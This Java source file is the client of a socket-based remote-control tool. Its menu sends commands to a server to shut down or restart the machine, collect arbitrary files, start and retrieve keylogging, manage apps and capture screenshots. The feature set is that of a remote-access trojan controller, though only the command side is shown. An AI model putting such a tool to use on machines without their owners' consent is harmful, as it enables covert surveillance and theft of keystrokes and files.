import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Scanner;

public class Client {
    public static void main(String[] args) {
        try {
            Socket socket = new Socket("localhost", 5000);
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter writer = new PrintWriter(socket.getOutputStream());

            Scanner sc = new Scanner(System.in);
            boolean exit = false;

            while (!exit) {
                System.out.println("\n MENU");
                System.out.println("0. Exit");
                System.out.println("1. Shutdown (After 15')");
                System.out.println("2. Restart (After 15')");
                System.out.println("3. Cancel Shutdown/ Restart");
                System.out.println("4. Collect File (via user disk address)");
                System.out.println("5. Start KeyLogging");
                System.out.println("6. Pause and Return keyLogging");
                System.out.println("7. List Apps");
                System.out.println("8. Start App");
                System.out.println("9. Stop App");
                System.out.println("10. Get Server Screenshot");
                System.out.println("\nEnter your choice: ");

                int choice = sc.nextInt();
                sc.nextLine();

                switch (choice) {
                    case 0:
                        exit = true;
                        break;

                    case 1:
                        writer.println("shutdown");
                        writer.flush();
                        System.out.println(reader.readLine());
                        break;

                    case 2:
                        writer.println("restart");
                        writer.flush();
                        System.out.println(reader.readLine());
                        break;

                    case 3:
                        writer.println("cancel");
                        writer.flush();
                        System.out.println(reader.readLine());
                        break;

                    case 4:
                        System.out.println("Insert the server path to the file: ");
                        String filePathServer = sc.nextLine();
                        writer.println("collect-" + filePathServer);
                        writer.flush();

                        int fileSize = Integer.parseInt(reader.readLine());
                        byte[] fileBytes = new byte[fileSize];
                        int totalBytesRead = 0;
                        int bytesReadThisTime;

                        while (totalBytesRead < fileSize) {
                            bytesReadThisTime = socket.getInputStream().read(fileBytes, totalBytesRead, fileBytes.length - totalBytesRead);
                            if (bytesReadThisTime == -1) {
                                System.out.println("End of stream reached before all bytes were read.");
                                break;
                            }
                            totalBytesRead += bytesReadThisTime;
                        }

                        if (totalBytesRead == fileSize) {
                            String fileAddress = Paths.get("").toAbsolutePath().toString() + "/";
                            System.out.println(fileAddress);
                            System.out.println("Insert file name: ");
                            String fileName = sc.nextLine();

                            Path filePathUserChecker = Paths.get(fileAddress);
                            Path filePathUser = Paths.get(fileAddress + fileName);

                            if (Files.isDirectory(filePathUserChecker.getParent()) && Files.isWritable(filePathUserChecker)) {
                                Files.write(filePathUser, fileBytes);
                                System.out.println("A new file has been added to: " + fileAddress);
                            } else {
                                System.out.println("Invalid file address or write permissions denied.");
                            }
                        } else {
                            System.out.println("Incomplete file transfer.");
                        }
                        break;

                    case 5:
                        writer.println("keylogging-start");
                        writer.flush();
                        break;

                    case 6:
                        writer.println("keylogging-end");
                        writer.flush();

                        String res = reader.readLine();
                        byte[] bytes = res.getBytes();
                        String fileAddress = Paths.get("").toAbsolutePath().toString() + "/";
                        System.out.println(fileAddress);

                        Path filePathLoggingChecker = Paths.get(fileAddress);
                        Path filePathLogging = Paths.get(fileAddress + "/keylogging.txt");

                        if (Files.isDirectory(filePathLoggingChecker.getParent()) && Files.isWritable(filePathLoggingChecker)) {
                            Files.write(filePathLogging, bytes);
                            System.out.println("A new file has been added to: " + fileAddress);
                        } else {
                            System.out.println("Invalid file address or write permissions denied.");
                        }

                        break;

                    case 7:
                        writer.println("list-apps");
                        writer.flush();
                    
                        String appsList = reader.readLine();
                        System.out.println("List of apps on the server:");
                        System.out.println(appsList);
                        break;

                    case 8:
                        System.out.println("Enter the name of the app you want to start: ");
                        String appName = sc.nextLine();
                    
                        writer.println("start-app-" + appName);
                        writer.flush();
                    
                        String response = reader.readLine();
                        System.out.println(response);
                        break;

                    case 9:
                        System.out.println("Enter the name of the app you want to stop: ");
                        String appName_stop = sc.nextLine();
                    
                        writer.println("stop-app-" + appName_stop);
                        writer.flush();
                    
                        String response_code = reader.readLine();
                        System.out.println(response_code);
                        break;

                    case 10:
                        writer.println("get-screenshot");
                        writer.flush();
                        System.out.println("Request sent for server screenshot. Check the server's response.");
                    
                        int screenshotSize = Integer.parseInt(reader.readLine());
                        byte[] screenshotBytes = new byte[screenshotSize];
                        totalBytesRead = 0;

                        while (totalBytesRead < screenshotSize) {
                            bytesReadThisTime = socket.getInputStream().read(screenshotBytes, totalBytesRead, screenshotBytes.length - totalBytesRead);
                            if (bytesReadThisTime == -1) {
                                System.out.println("End of stream reached before all bytes were read.");
                                break;
                            }
                            totalBytesRead += bytesReadThisTime;
                        }

                        if (totalBytesRead >= screenshotSize) {
                            String screenshotAddress = Paths.get("").toAbsolutePath().toString() + "/";
                            System.out.println(screenshotAddress);
                            System.out.println("Enter screenshot file name: ");
                            String screenshotFileName = sc.nextLine();

                            Path screenshotAddressChecker = Paths.get(screenshotAddress);
                            Path screenshotFilePath = Paths.get(screenshotAddress + screenshotFileName);
                    
                            if (Files.isDirectory(screenshotAddressChecker.getParent()) && Files.isWritable(screenshotAddressChecker)) {
                                Files.write(screenshotFilePath, screenshotBytes);
                                System.out.println("Server screenshot saved to: " + screenshotFilePath);
                            } else {
                                System.out.println("Invalid file address or write permissions denied.");
                            }
                        } else {
                            System.out.println("Incomplete screenshot transfer.");
                        }
                        break;


                    default:
                        throw new AssertionError();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
